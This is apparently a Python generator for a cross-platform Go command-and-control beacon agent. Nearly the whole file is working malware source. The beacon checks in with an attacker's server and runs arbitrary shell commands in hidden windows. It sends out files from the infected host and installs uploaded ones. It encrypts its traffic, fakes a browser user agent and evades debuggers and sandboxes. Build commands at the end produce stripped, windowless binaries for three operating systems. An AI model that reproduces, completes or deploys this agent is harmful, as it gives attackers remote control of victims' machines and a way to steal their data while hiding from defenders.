"""
Go Agent Template Generator
Cross-platform beacon agent in Go with evasion capabilities

Features:
- Native Windows/Linux/macOS support
- Anti-debug and anti-analysis
- Memory-only execution
- Syscall-based operations (Windows)
"""
import os
import base64
from string import Template
from typing import Dict, Optional
from dataclasses import dataclass


@dataclass
class GoAgentConfig:
    """Go agent configuration"""
    c2_host: str
    c2_port: int = 443
    sleep_time: int = 60
    jitter_percent: int = 30
    use_https: bool = True
    proxy: Optional[str] = None
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    kill_date: Optional[str] = None
    working_hours: Optional[str] = None
    evasion_level: int = 3


class GoAgentGenerator:
    """Generate Go-based C2 agent"""
    
    MAIN_TEMPLATE = '''package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "strings"
    "syscall"
    "time"
)

// Configuration - embedded at compile time
var (
    c2Host       = "$C2_HOST"
    c2Port       = $C2_PORT
    sleepTime    = $SLEEP_TIME
    jitterPct    = $JITTER_PERCENT
    useHTTPS     = $USE_HTTPS
    userAgent    = "$USER_AGENT"
    killDate     = "$KILL_DATE"
    workingHours = "$WORKING_HOURS"
    evasionLevel = $EVASION_LEVEL
    aesKey       = []byte("$AES_KEY")
)

// BeaconMeta contains beacon metadata
type BeaconMeta struct {
    ID       string `json:"id"`
    Hostname string `json:"hostname"`
    Username string `json:"username"`
    OS       string `json:"os"`
    Arch     string `json:"arch"`
    PID      int    `json:"pid"`
}

// Task from C2
type Task struct {
    ID      string `json:"id"`
    Type    string `json:"type"`
    Command string `json:"command,omitempty"`
    Args    string `json:"args,omitempty"`
}

// TaskResult contains task execution result
type TaskResult struct {
    TaskID  string `json:"task_id"`
    Success bool   `json:"success"`
    Output  string `json:"output,omitempty"`
    Error   string `json:"error,omitempty"`
}

var beaconID string
var httpClient *http.Client

func main() {
    if evasionLevel >= 2 && isDebuggerPresent() {
        os.Exit(0)
    }
    if evasionLevel >= 3 && isSandbox() {
        time.Sleep(time.Hour)
        os.Exit(0)
    }
    if killDate != "" && isKillDatePassed() {
        os.Exit(0)
    }
    beaconID = generateBeaconID()
    httpClient = createHTTPClient()
    for {
        if workingHours != "" && !isWorkingHours() {
            time.Sleep(time.Hour)
            continue
        }
        tasks, err := checkin()
        if err == nil {
            for _, task := range tasks {
                result := executeTask(task)
                sendResult(result)
            }
        }
        sleepWithJitter()
    }
}

func generateBeaconID() string {
    hostname, _ := os.Hostname()
    data := fmt.Sprintf("%s-%d-%d", hostname, os.Getpid(), time.Now().UnixNano())
    hash := sha256.Sum256([]byte(data))
    return fmt.Sprintf("%x", hash[:8])
}

func createHTTPClient() *http.Client {
    transport := &http.Transport{DisableKeepAlives: false, MaxIdleConns: 10, IdleConnTimeout: 30 * time.Second}
    return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func getC2URL(endpoint string) string {
    protocol := "http"
    if useHTTPS {
        protocol = "https"
    }
    return fmt.Sprintf("%s://%s:%d%s", protocol, c2Host, c2Port, endpoint)
}

func getMeta() BeaconMeta {
    hostname, _ := os.Hostname()
    username := "unknown"
    if u, err := user.Current(); err == nil {
        username = u.Username
    }
    return BeaconMeta{ID: beaconID, Hostname: hostname, Username: username, OS: runtime.GOOS, Arch: runtime.GOARCH, PID: os.Getpid()}
}

func checkin() ([]Task, error) {
    meta := getMeta()
    data, _ := json.Marshal(meta)
    if evasionLevel >= 1 {
        data = encrypt(data)
    }
    req, _ := http.NewRequest("POST", getC2URL("/beacon/checkin"), bytes.NewReader(data))
    req.Header.Set("User-Agent", userAgent)
    req.Header.Set("Content-Type", "application/octet-stream")
    resp, err := httpClient.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)
    if evasionLevel >= 1 {
        body = decrypt(body)
    }
    var response struct {
        Tasks []Task `json:"tasks"`
    }
    json.Unmarshal(body, &response)
    return response.Tasks, nil
}

func sendResult(result TaskResult) {
    data, _ := json.Marshal(result)
    if evasionLevel >= 1 {
        data = encrypt(data)
    }
    req, _ := http.NewRequest("POST", getC2URL("/beacon/results"), bytes.NewReader(data))
    req.Header.Set("User-Agent", userAgent)
    req.Header.Set("Content-Type", "application/octet-stream")
    resp, err := httpClient.Do(req)
    if err == nil {
        resp.Body.Close()
    }
}

func executeTask(task Task) TaskResult {
    result := TaskResult{TaskID: task.ID, Success: true}
    switch task.Type {
    case "cmd", "shell":
        output, err := executeCommand(task.Command)
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        } else {
            result.Output = output
        }
    case "download":
        content, err := readFile(task.Command)
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        } else {
            result.Output = base64.StdEncoding.EncodeToString(content)
        }
    case "upload":
        err := writeFile(task.Command, task.Args)
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }
    case "exit":
        os.Exit(0)
    default:
        result.Success = false
        result.Error = "Unknown task type"
    }
    return result
}

func executeCommand(cmd string) (string, error) {
    var shell, flag string
    if runtime.GOOS == "windows" {
        shell = "cmd.exe"
        flag = "/c"
    } else {
        shell = "/bin/sh"
        flag = "-c"
    }
    command := exec.Command(shell, flag, cmd)
    if runtime.GOOS == "windows" {
        command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    }
    output, err := command.CombinedOutput()
    return string(output), err
}

func readFile(path string) ([]byte, error) {
    return os.ReadFile(path)
}

func writeFile(path, content string) error {
    data, err := base64.StdEncoding.DecodeString(content)
    if err != nil {
        return err
    }
    return os.WriteFile(path, data, 0644)
}

func sleepWithJitter() {
    jitter := float64(jitterPct) / 100.0
    variance := float64(sleepTime) * jitter
    var randBytes [8]byte
    rand.Read(randBytes[:])
    randFloat := float64(randBytes[0]) / 255.0
    actualSleep := float64(sleepTime) + (variance * (randFloat*2 - 1))
    if actualSleep < 1 {
        actualSleep = 1
    }
    time.Sleep(time.Duration(actualSleep) * time.Second)
}

func isKillDatePassed() bool {
    kill, err := time.Parse("2006-01-02", killDate)
    if err != nil {
        return false
    }
    return time.Now().After(kill)
}

func isWorkingHours() bool {
    parts := strings.Split(workingHours, "-")
    if len(parts) != 2 {
        return true
    }
    start, _ := time.Parse("15:04", parts[0])
    end, _ := time.Parse("15:04", parts[1])
    now := time.Now()
    current := time.Date(0, 1, 1, now.Hour(), now.Minute(), 0, 0, time.UTC)
    startTime := time.Date(0, 1, 1, start.Hour(), start.Minute(), 0, 0, time.UTC)
    endTime := time.Date(0, 1, 1, end.Hour(), end.Minute(), 0, 0, time.UTC)
    return current.After(startTime) && current.Before(endTime)
}

func isDebuggerPresent() bool {
    if runtime.GOOS != "windows" {
        return false
    }
    kernel32, err := syscall.LoadDLL("kernel32.dll")
    if err != nil {
        return false
    }
    defer kernel32.Release()
    proc, err := kernel32.FindProc("IsDebuggerPresent")
    if err != nil {
        return false
    }
    ret, _, _ := proc.Call()
    return ret != 0
}

func isSandbox() bool {
    if runtime.NumCPU() < 2 {
        return true
    }
    sandboxProcs := []string{"vmsrvc", "vboxservice", "vmtoolsd", "wireshark", "procmon", "x32dbg", "x64dbg", "ollydbg", "ida", "fiddler"}
    hostname, _ := os.Hostname()
    hostLower := strings.ToLower(hostname)
    for _, name := range sandboxProcs {
        if strings.Contains(hostLower, name) {
            return true
        }
    }
    if u, err := user.Current(); err == nil {
        userName := strings.ToLower(u.Username)
        sandboxUsers := []string{"sandbox", "virus", "malware", "sample"}
        for _, su := range sandboxUsers {
            if strings.Contains(userName, su) {
                return true
            }
        }
    }
    return false
}

func encrypt(data []byte) []byte {
    block, err := aes.NewCipher(aesKey[:32])
    if err != nil {
        return data
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return data
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return data
    }
    return gcm.Seal(nonce, nonce, data, nil)
}

func decrypt(data []byte) []byte {
    block, err := aes.NewCipher(aesKey[:32])
    if err != nil {
        return data
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return data
    }
    if len(data) < gcm.NonceSize() {
        return data
    }
    nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return data
    }
    return plaintext
}
'''

    def __init__(self, config: GoAgentConfig):
        self.config = config
    
    def generate(self) -> str:
        """Generate Go source code using Template substitution"""
        # Generate AES key
        aes_key = base64.b64encode(os.urandom(32)).decode()[:32]
        
        # Use string.Template for $ substitution (safe for Go code)
        template = Template(self.MAIN_TEMPLATE)
        return template.substitute(
            C2_HOST=self.config.c2_host,
            C2_PORT=self.config.c2_port,
            SLEEP_TIME=self.config.sleep_time,
            JITTER_PERCENT=self.config.jitter_percent,
            USE_HTTPS=str(self.config.use_https).lower(),
            USER_AGENT=self.config.user_agent,
            KILL_DATE=self.config.kill_date or "",
            WORKING_HOURS=self.config.working_hours or "",
            EVASION_LEVEL=self.config.evasion_level,
            AES_KEY=aes_key
        )
    
    def save(self, output_path: str):
        """Save Go source to file"""
        source = self.generate()
        with open(output_path, 'w') as f:
            f.write(source)
        return output_path
    
    def get_build_commands(self, output_name: str = "agent") -> Dict[str, str]:
        """Get build commands for different platforms"""
        return {
            "windows_amd64": f"GOOS=windows GOARCH=amd64 go build -ldflags='-s -w -H=windowsgui' -o {output_name}.exe",
            "windows_386": f"GOOS=windows GOARCH=386 go build -ldflags='-s -w -H=windowsgui' -o {output_name}_x86.exe",
            "linux_amd64": f"GOOS=linux GOARCH=amd64 go build -ldflags='-s -w' -o {output_name}_linux",
            "linux_386": f"GOOS=linux GOARCH=386 go build -ldflags='-s -w' -o {output_name}_linux_x86",
            "darwin_amd64": f"GOOS=darwin GOARCH=amd64 go build -ldflags='-s -w' -o {output_name}_macos",
            "darwin_arm64": f"GOOS=darwin GOARCH=arm64 go build -ldflags='-s -w' -o {output_name}_macos_arm64"
        }


# Convenience function
def generate_go_agent(c2_host: str, c2_port: int = 443, **kwargs) -> str:
    """Generate Go agent source"""
    config = GoAgentConfig(c2_host=c2_host, c2_port=c2_port, **kwargs)
    generator = GoAgentGenerator(config)
    return generator.generate()
